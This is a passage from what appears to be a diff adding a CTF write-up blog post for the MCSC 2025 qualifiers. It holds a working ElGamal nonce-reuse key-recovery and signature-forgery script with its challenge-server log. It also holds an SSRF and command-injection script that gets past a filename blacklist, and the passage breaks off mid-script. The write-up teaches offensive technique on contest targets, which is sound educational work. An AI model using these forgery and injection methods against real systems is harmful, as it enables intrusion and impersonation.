@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>MCSC 2025 Qualifiers Writeup - TheSaucese&#39;s Blog</title><meta name="Description" content="$ sudo apt install pwntools"><meta property="og:url" content="https://thesaucese.github.io/mcsc-2025-qualifiers-writeup/">
+  <meta property="og:site_name" content="TheSaucese&#39;s Blog">
+  <meta property="og:title" content="MCSC 2025 Qualifiers Writeup">
+  <meta property="og:description" content="Lessgoo qualified!">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-18T20:52:13+06:00">
+    <meta property="article:modified_time" content="2025-03-18T20:52:13+06:00">
+    <meta property="og:image" content="https://thesaucese.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://thesaucese.github.io/logo.png">
+  <meta name="twitter:title" content="MCSC 2025 Qualifiers Writeup">
+  <meta name="twitter:description" content="Lessgoo qualified!">
+<meta name="application-name" content="Blogs">
+<meta name="apple-mobile-web-app-title" content="Blogs"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thesaucese.github.io/mcsc-2025-qualifiers-writeup/" /><link rel="prev" href="https://thesaucese.github.io/vishwactf/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "MCSC 2025 Qualifiers Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thesaucese.github.io\/mcsc-2025-qualifiers-writeup\/"
+        },"genre": "posts","wordcount":  1611 ,
+        "url": "https:\/\/thesaucese.github.io\/mcsc-2025-qualifiers-writeup\/","datePublished": "2025-03-18T20:52:13+06:00","dateModified": "2025-03-18T20:52:13+06:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "theSaucese"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="TheSaucese&#39;s Blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/aboutme/"> About Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="TheSaucese&#39;s Blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/aboutme/" title="">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">MCSC 2025 Qualifiers Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://thesaucese.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>theSaucese</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-18">2025-03-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1611 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#simplerev---rev">Simplerev - Rev</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#explanation">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#custom-signing----crypto">Custom Signing  - Crypto</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#explanation-1">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#ctfit-v200---web">CTFit v200 - Web</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#explanation-2">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#legite---dfir">LEGITE - DFIR</a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#explanation-3">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#apt4444---dfir">APT4444 - DFIR</a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#explanation-4">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#xor---rev">XOR - Rev</a>
+      <ul>
+        <li><a href="#description-5">Description</a></li>
+        <li><a href="#explanation-5">Explanation</a></li>
+      </ul>
+    </li>
+    <li><a href="#stack---rev">Stack - Rev</a>
+      <ul>
+        <li><a href="#description-6">Description</a></li>
+        <li><a href="#explanation-6">Explanation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Lessgoo qualified!</p>
+<h2 id="simplerev---rev">Simplerev - Rev</h2>
+<h3 id="description">Description</h3>
+<p>2nd blood, cool :)</p>
+<h3 id="explanation">Explanation</h3>
+<p>As the name suggests. It is a generic challenge where the binary is packed with UPX.</p>
+<h2 id="custom-signing----crypto">Custom Signing  - Crypto</h2>
+<h3 id="description-1">Description</h3>
+<p>3rd blood :)</p>
+<h3 id="explanation-1">Explanation</h3>
+<p>Forged signature stuff, it just works.</p>
+<p>nc 44.205.249.139 5000
+khtar: 1
+[94487894190472469692044006284299320197652325967778183922481151437995602828466777049136846759093117139256144672439316636652824716059115250773573746542693268069355571575311188787645209896782662201013979887987833806792084210274156458593815275594199755625442071092228211376360288484982557747024933987931036533939, 15571437614726840189267804132018914339497198046180284278930971967182986290565610742849808871378313122012094124277684479134773628468503794977774681829275081680576589210293822596240157763994725595460693722221166145907024855526180840889156107949603870966484385349597148393295477829024439916433696909473493071501, 52507490155988691742486336687903925095022917911974345244054965363369074714558180236210926919109948343645817716135975312672857997269794602675589216753380471473536978867382650859186856153741429728762545992456030046322226542656359096400265013966804896395916876735484729359276443683067954518810859389105, 1027830439987681720003776775579357821309845943125008315810225468038295230854274556087777247553655031281457354507189981952367787570974782312038716132510740457255501306243140825358094736791957437499427348375457506157073034147467686324479617339077280680072533998926231551005524659735550899247936043845841747843, 109916461592363025286250268544663071240940005605145271826554186541310690667207144304940194510583872622494201671262285933048892021854604047999009518786547908530788410959775530686127920127172394854095480554539872924805009765255369858647647109236024841634820942988253643711174021643678270222129214523734201236389, 3]
+khtar: 1
+[94487894190472469692044006284299320197652325967778183922481151437995602828466777049136846759093117139256144672439316636652824716059115250773573746542693268069355571575311188787645209896782662201013979887987833806792084210274156458593815275594199755625442071092228211376360288484982557747024933987931036533939, 44311030821574989603886961091748686638682808417317101836256365793323707888685768861440433231197103515488884149310593359287749325313409525787550407417245814025245028839217313013356282010971496866448328012633151175464635653014075046134471384185980248662809318793102810630566834003186056166370584895875300504262, 8693647696985508688858934213492779953089179233567552199272459849286298758396872584788900295827734319819025885291264103985475312898864864246702495827646484671849400535802017739676716282729386166420179751623320494476253096864028192388737831725375958415181464338855007715200062212682664423924937312576714, 1027830439987681720003776775579357821309845943125008315810225468038295230854274556087777247553655031281457354507189981952367787570974782312038716132510740457255501306243140825358094736791957437499427348375457506157073034147467686324479617339077280680072533998926231551005524659735550899247936043845841747843, 109916461592363025286250268544663071240940005605145271826554186541310690667207144304940194510583872622494201671262285933048892021854604047999009518786547908530788410959775530686127920127172394854095480554539872924805009765255369858647647109236024841634820942988253643711174021643678270222129214523734201236389, 3]
+all good
+khtar: 2
+Prove that nta howa nta: 12345, 94487894190472469692044006284299320197652325967778183922481151437995602828466777049136846759093117139256144672439316636652824716059115250773573746542693268069355571575311188787645209896782662201013979887987833806792084210274156458593815275594199755625442071092228211376360288484982557747024933987931036533939, 62647677455572525785047084099212301473117891938542374521646888119216283989202722109716845246797366217467469263373286240717290797557911432178250215352717112655911478315787768352940312383803516973895555117238051006830881332170324402550379169881820324423770874694780169745005209618356316475848157307071329603525, 1027830439987681720003776775579357821309845943125008315810225468038295230854274556087777247553655031281457354507189981952367787570974782312038716132510740457255501306243140825358094736791957437499427348375457506157073034147467686324479617339077280680072533998926231551005524659735550899247936043845841747843
+MCSC{k_k_k_k_d0n7_eV3r_r3use_17}</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">inverse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Intercepted signature values ---</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># These values come from two rounds of option 1 (they must share the same r, p, g, y)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Signature 1 (tuple: [r, s1, m1, y, p, g])</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="mi">94487894190472469692044006284299320197652325967778183922481151437995602828466777049136846759093117139256144672439316636652824716059115250773573746542693268069355571575311188787645209896782662201013979887987833806792084210274156458593815275594199755625442071092228211376360288484982557747024933987931036533939</span>
+</span></span><span class="line"><span class="cl"><span class="n">s1</span> <span class="o">=</span> <span class="mi">15571437614726840189267804132018914339497198046180284278930971967182986290565610742849808871378313122012094124277684479134773628468503794977774681829275081680576589210293822596240157763994725595460693722221166145907024855526180840889156107949603870966484385349597148393295477829024439916433696909473493071501</span>
+</span></span><span class="line"><span class="cl"><span class="n">m1</span> <span class="o">=</span> <span class="mi">52507490155988691742486336687903925095022917911974345244054965363369074714558180236210926919109948343645817716135975312672857997269794602675589216753380471473536978867382650859186856153741429728762545992456030046322226542656359096400265013966804896395916876735484729359276443683067954518810859389105</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Signature 2 (tuple: [r, s2, m2, y, p, g])</span>
+</span></span><span class="line"><span class="cl"><span class="n">s2</span> <span class="o">=</span> <span class="mi">44311030821574989603886961091748686638682808417317101836256365793323707888685768861440433231197103515488884149310593359287749325313409525787550407417245814025245028839217313013356282010971496866448328012633151175464635653014075046134471384185980248662809318793102810630566834003186056166370584895875300504262</span>
+</span></span><span class="line"><span class="cl"><span class="n">m2</span> <span class="o">=</span> <span class="mi">8693647696985508688858934213492779953089179233567552199272459849286298758396872584788900295827734319819025885291264103985475312898864864246702495827646484671849400535802017739676716282729386166420179751623320494476253096864028192388737831725375958415181464338855007715200062212682664423924937312576714</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Public key and other parameters (from either signature, they are the same)</span>
+</span></span><span class="line"><span class="cl"><span class="n">y</span> <span class="o">=</span> <span class="mi">1027830439987681720003776775579357821309845943125008315810225468038295230854274556087777247553655031281457354507189981952367787570974782312038716132510740457255501306243140825358094736791957437499427348375457506157073034147467686324479617339077280680072533998926231551005524659735550899247936043845841747843</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">109916461592363025286250268544663071240940005605145271826554186541310690667207144304940194510583872622494201671262285933048892021854604047999009518786547908530788410959775530686127920127172394854095480554539872924805009765255369858647647109236024841634820942988253643711174021643678270222129214523734201236389</span>
+</span></span><span class="line"><span class="cl"><span class="n">g</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Choose a new message m&#39; for which you want to forge a signature ---</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_new</span> <span class="o">=</span> <span class="mi">12345</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The signature equations are computed modulo (p - 1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">mod</span> <span class="o">=</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Step 1: Compute k ---</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We have:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   s1 = (m1 - x * r) * k^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   s2 = (m2 - x * r) * k^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Subtracting gives:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   s1 - s2 = (m1 - m2) * k^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Therefore, k can be recovered as:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   k = (m1 - m2) * (s1 - s2)^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">diff_m</span> <span class="o">=</span> <span class="p">(</span><span class="n">m1</span> <span class="o">-</span> <span class="n">m2</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
+</span></span><span class="line"><span class="cl"><span class="n">diff_s</span> <span class="o">=</span> <span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s2</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Compute the modular inverse of diff_s modulo mod.</span>
+</span></span><span class="line"><span class="cl"><span class="n">inv_diff_s</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">diff_s</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">diff_m</span> <span class="o">*</span> <span class="n">inv_diff_s</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Step 2: Recover the private key x ---</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># From signature 1:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   s1 = (m1 - x * r) * k^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Rearranging gives:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   x = (m1 - k * s1) * r^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">inv_r</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="p">((</span><span class="n">m1</span> <span class="o">-</span> <span class="n">k</span> <span class="o">*</span> <span class="n">s1</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span> <span class="o">*</span> <span class="n">inv_r</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Step 3: Forge a signature for m_new ---</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We need to compute s&#39; such that:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   s&#39; = (m_new - x * r) * k^{-1}  mod (p-1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">inv_k</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s_new</span> <span class="o">=</span> <span class="p">((</span><span class="n">m_new</span> <span class="o">-</span> <span class="n">x</span> <span class="o">*</span> <span class="n">r</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span> <span class="o">*</span> <span class="n">inv_k</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># --- Output the forged signature ---</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Forged signature for message m&#39; =&#34;</span><span class="p">,</span> <span class="n">m_new</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;r =&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s&#39; =&#34;</span><span class="p">,</span> <span class="n">s_new</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;y =&#34;</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The forged signature to submit is:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    m_new, r, s_new, y</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">m_new</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">s_new</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="ctfit-v200---web">CTFit v200 - Web</h2>
+<h3 id="description-2">Description</h3>
+<p>Python CVE.</p>
+<h3 id="explanation-2">Explanation</h3>
+<p>The blacklist forgot about rev, tac, base32 and many other tools that we can read the flag with, &ldquo;.&rdquo; was blacklisted but we can just do &ldquo;rev flag?txt&rdquo;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span> <span class="n">parse_qs</span><span class="p">,</span> <span class="n">quote</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Target URL of the challenge</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;http://52.90.112.191:5000/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Craft the payload:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Instead of specifying a literal file name with a dot (like flag.txt), we use a glob.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This payload loops over files starting with &#34;flag&#34; and uses tac to print their contents.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Note: tac prints the file in reverse, so you&#39;ll need to reverse the output to get the flag.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;rev flag?txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># URL‑encode the payload to safely include special characters</span>
+</span></span><span class="line"><span class="cl"><span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Construct the SSRF URL using an alternative representation of localhost (0x7f000001)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ssrf_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://0x7f000001:5000/order?challnumber=2555&amp;cmd=</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Data to be submitted to the vulnerable endpoint</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="n">ssrf_url</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Sending SSRF request to trigger command injection...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Received status code:&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">302</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to trigger SSRF. Response code:&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Response content:&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract the redirect URL from the Location header</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect_url</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;Location&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">redirect_url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] No redirect found.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">redirect_url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">full_redirect</span> <span class="o">=</span> <span class="n">TARGET</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">redirect_url</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">full_redirect</span> <span class="o">=</span> <span class="n">redirect_url</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Following redirect to: </span><span class="si">{</span><span class="n">full_redirect</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">full_redirect</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">r2</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to retrieve redirected page. Response code:&#34;</span><span class="p">,</span> <span class="n">r2</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract the &#39;data&#39; parameter from the redirect URL</span>
+</span></span><span class="line"><span class="cl"><span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">full_redirect</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">qs</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">parsed_url</span><span class="o">.</span><span class="n">query</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="s1">&#39;data&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">qs</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">qs</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] &#39;data&#39; parameter not found or empty in the redirect URL.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">full_data</span> <span class="o">=</span> <span class="n">qs</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Full base64 string extracted:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">full_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Decode the base64 output to get the (reversed) file content</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
